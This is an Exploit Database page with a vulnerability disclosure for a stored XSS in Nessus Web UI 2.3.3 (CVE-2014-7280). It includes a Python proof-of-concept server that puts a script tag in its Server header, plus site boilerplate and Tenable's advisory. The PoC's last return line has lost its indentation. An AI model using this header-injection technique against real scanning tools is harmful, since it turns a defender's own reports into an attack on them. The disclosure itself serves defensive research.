Nessus Web UI 2.3.3: Stored XSS
=========================================================

CVE number: CVE-2014-7280
Permalink: <http://www.thesecurityfactory.be/permalink/nessus-stored-xss.html>
Vendor advisory: <http://www.tenable.com/security/tns-2014-08>

-- Info --

Nessus is a proprietary comprehensive vulnerability scanner which is developed by Tenable Network Security. Tenable
Network Security estimates that it is used by over 75,000 organisations worldwide.

-- Affected version -

Web UI version 2.3.3, Build #83

-- Vulnerability details --

By setting up a malicious web server that returns a specially crafted host header, an attacker is able to execute
javascript code on the machine of the person performing a vulnerability scan of the web server. No escaping on
javascript code is being performed when passing the server header to the affected Web UI version via a plugin.
The javascript code will be stored in the backend database, and will execute every time the target views a report that
returns the server header.

-- POC --

#!/usr/bin/env python
import sys
from twisted.web import server, resource
from twisted.internet import reactor
from twisted.python import log

class Site(server.Site):
    def getResourceFor(self, request):
        request.setHeader('server', '<script>alert(1)</script>SomeServer')
        return server.Site.getResourceFor(self, request)

class HelloResource(resource.Resource):
    isLeaf = True
    numberRequests = 0

    def render_GET(self, request):
        self.numberRequests += 1
        request.setHeader("content-type", "text/plain")
return "theSecurityFactory Nessus POC"

log.startLogging(sys.stderr)
reactor.listenTCP(8080, Site(HelloResource()))
reactor.run()

-- Solution --

This issue has been fixed as of version 2.3.4 of the WEB UI.

-- Timeline --

2014-06-12   Release of Web UI version 2.3.3, build#83

2014-06-13        Vulnerability discovered and creation of POC

2014-06-13        Vulnerability responsibly reported to vendor

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# [R3] Nessus Web UI Scanned Content Stored XSS

Medium

[← View More Security Advisories](/security)
### Synopsis

The Nessus scanner's web-based user interface (Web UI) was vulnerable to a stored cross-site scripting (XSS) attack. The issue was due to a security control being briefly removed due to a regression error. During this 48 hour window, one new build of the Web UI was released leading to the ability to inject arbitrary script code. This could be done by setting up a malicious web server that returned a crafted host header containing JavaScript. When Nessus scanned the web server, the input would be passed as-is and render when viewing a report.

### Solution

Tenable has released version 2.3.4 Build #85 of the Nessus Web UI that fixes this issue. Nessus users automatically received this fix as part of the plugin feed daily update.
